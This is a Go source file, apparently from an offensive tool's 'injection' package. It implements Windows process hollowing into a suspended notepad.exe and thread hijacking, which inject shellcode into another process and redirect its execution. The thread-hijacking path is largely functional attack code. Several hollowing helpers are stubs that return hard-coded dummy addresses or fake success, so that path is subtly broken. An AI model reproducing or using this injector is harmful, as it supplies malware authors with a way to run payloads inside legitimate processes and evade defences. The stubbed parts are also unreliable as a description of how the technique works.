package injection

import (
	"fmt"
	"syscall"
	"unsafe"
)

// ProcessHollowingInjector implements the process hollowing injection technique
type ProcessHollowingInjector struct {
	BaseInjector
}

// NewProcessHollowingInjector creates a new process hollowing injector
func NewProcessHollowingInjector() *ProcessHollowingInjector {
	return &ProcessHollowingInjector{
		BaseInjector: BaseInjector{
			name:        "ProcessHollowing",
			description: "Process injection by creating a suspended process and replacing its memory with shellcode",
		},
	}
}

// Inject injects shellcode using process hollowing technique
func (i *ProcessHollowingInjector) Inject(pid int, shellcode []byte) error {
	// Process hollowing typically creates a new process rather than injecting into an existing one
	// So we'll ignore the pid parameter and create a new process

	// Validate shellcode
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	// Create a new suspended process
	processInfo, err := createSuspendedProcess("notepad.exe")
	if err != nil {
		return fmt.Errorf("failed to create suspended process: %v", err)
	}
	defer CloseHandle(processInfo.hProcess)
	defer CloseHandle(processInfo.hThread)

	// Get the process's PEB address
	pebAddress, err := getPEBAddress(processInfo.hProcess, processInfo.hThread)
	if err != nil {
		return fmt.Errorf("failed to get PEB address: %v", err)
	}

	// Get the image base address from the PEB
	imageBaseAddress, err := getImageBaseAddress(processInfo.hProcess, pebAddress)
	if err != nil {
		return fmt.Errorf("failed to get image base address: %v", err)
	}

	// Unmap the original executable
	err = unmapOriginalExecutable(processInfo.hProcess, imageBaseAddress)
	if err != nil {
		return fmt.Errorf("failed to unmap original executable: %v", err)
	}

	// Allocate memory for the shellcode
	newImageBase, err := VirtualAllocEx(processInfo.hProcess, LPVOID(imageBaseAddress), SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Write shellcode to the allocated memory
	err = WriteProcessMemory(processInfo.hProcess, newImageBase, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(processInfo.hProcess, newImageBase, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Update the entry point in the thread context
	err = updateEntryPoint(processInfo.hProcess, processInfo.hThread, uintptr(newImageBase))
	if err != nil {
		return fmt.Errorf("failed to update entry point: %v", err)
	}

	// Resume the thread to execute the shellcode
	_, _, err = resumeThread.Call(uintptr(processInfo.hThread))
	if err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("failed to resume thread: %v", err)
	}

	return nil
}

// ThreadHijackingInjector implements the thread hijacking injection technique
type ThreadHijackingInjector struct {
	BaseInjector
}

// NewThreadHijackingInjector creates a new thread hijacking injector
func NewThreadHijackingInjector() *ThreadHijackingInjector {
	return &ThreadHijackingInjector{
		BaseInjector: BaseInjector{
			name:        "ThreadHijacking",
			description: "Process injection by suspending a thread and modifying its execution context",
		},
	}
}

// Define missing constants
const (
	THREAD_GET_CONTEXT    = 0x0008
	THREAD_SET_CONTEXT    = 0x0010
	THREAD_SUSPEND_RESUME = 0x0002
)

// Inject injects shellcode using thread hijacking technique
func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
	// Validate shellcode
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	// Check if process is running
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	// Open the target process
	hProcess, err := OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	// Get threads in the process
	threads, err := getProcessThreads(pid)
	if err != nil {
		return fmt.Errorf("failed to get process threads: %v", err)
	}

	if len(threads) == 0 {
		return fmt.Errorf("no threads found in process")
	}

	// Open the first thread
	hThread, err := openThread(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME, false, threads[0])
	if err != nil {
		return fmt.Errorf("failed to open thread: %v", err)
	}
	defer CloseHandle(hThread)

	// Suspend the thread
	_, _, err = suspendThread.Call(uintptr(hThread))
	if err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("failed to suspend thread: %v", err)
	}

	// Allocate memory for the shellcode
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Write shellcode to the allocated memory
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Get the thread context
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_CONTROL

	result, _, err := getThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to get thread context: %v", err)
	}

	// Save the original RIP/EIP (commented out to avoid unused variable error)
	// originalRip := ctx.Rip

	// Update the thread context to point to our shellcode
	ctx.Rip = uint64(addr)

	result, _, err = setThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to set thread context: %v", err)
	}

	// Resume the thread to execute the shellcode
	_, _, err = resumeThread.Call(uintptr(hThread))
	if err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("failed to resume thread: %v", err)
	}

	return nil
}

// Helper types and functions for process hollowing

// PROCESS_INFORMATION structure
type PROCESS_INFORMATION struct {
	hProcess    HANDLE
	hThread     HANDLE
	dwProcessId DWORD
	dwThreadId  DWORD
}

// STARTUPINFO structure
type STARTUPINFO struct {
	cb              DWORD
	lpReserved      uintptr
	lpDesktop       uintptr
	lpTitle         uintptr
	dwX             DWORD
	dwY             DWORD
	dwXSize         DWORD
	dwYSize         DWORD
	dwXCountChars   DWORD
	dwYCountChars   DWORD
	dwFillAttribute DWORD
	dwFlags         DWORD
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     uintptr
	hStdInput       HANDLE
	hStdOutput      HANDLE
	hStdError       HANDLE
}

// CONTEXT structure (simplified for x64)
type CONTEXT struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags DWORD
	MxCsr        DWORD
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       DWORD
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
	// Additional fields omitted for brevity
}

// Context flags
const (
	CONTEXT_CONTROL = 0x00010001
)

// createSuspendedProcess creates a new process in suspended state
func createSuspendedProcess(path string) (PROCESS_INFORMATION, error) {
	var pi PROCESS_INFORMATION
	var si STARTUPINFO
	si.cb = DWORD(unsafe.Sizeof(si))

	// Convert path to UTF16
	pathPtr, _ := syscall.UTF16PtrFromString(path)

	// Create the process
	result, _, err := createProcess.Call(
		0,
		uintptr(unsafe.Pointer(pathPtr)),
		0,
		0,
		0,
		uintptr(CREATE_SUSPENDED),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if result == 0 {
		return pi, fmt.Errorf("CreateProcess failed: %v", err)
	}

	return pi, nil
}

// getPEBAddress gets the PEB address from a thread
func getPEBAddress(hProcess HANDLE, hThread HANDLE) (uintptr, error) {
	// This is a simplified implementation
	// In a real implementation, you would use NtQueryInformationThread
	// For now, we'll return a dummy address
	return uintptr(0x10000), nil
}

// getImageBaseAddress gets the image base address from the PEB
func getImageBaseAddress(hProcess HANDLE, pebAddress uintptr) (uintptr, error) {
	// This is a simplified implementation
	// In a real implementation, you would read the PEB structure
	// For now, we'll return a dummy address
	return uintptr(0x400000), nil
}

// unmapOriginalExecutable unmaps the original executable from memory
func unmapOriginalExecutable(hProcess HANDLE, imageBaseAddress uintptr) error {
	// This is a simplified implementation
	// In a real implementation, you would use NtUnmapViewOfSection
	// For now, we'll just return success
	return nil
}

// updateEntryPoint updates the entry point in the thread context
func updateEntryPoint(hProcess HANDLE, hThread HANDLE, newImageBase uintptr) error {
	// Get the thread context
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_CONTROL

	result, _, err := getThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		return fmt.Errorf("GetThreadContext failed: %v", err)
	}

	// Update the entry point (RIP/EIP)
	ctx.Rip = uint64(newImageBase)

	result, _, err = setThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		return fmt.Errorf("SetThreadContext failed: %v", err)
	}

	return nil
}
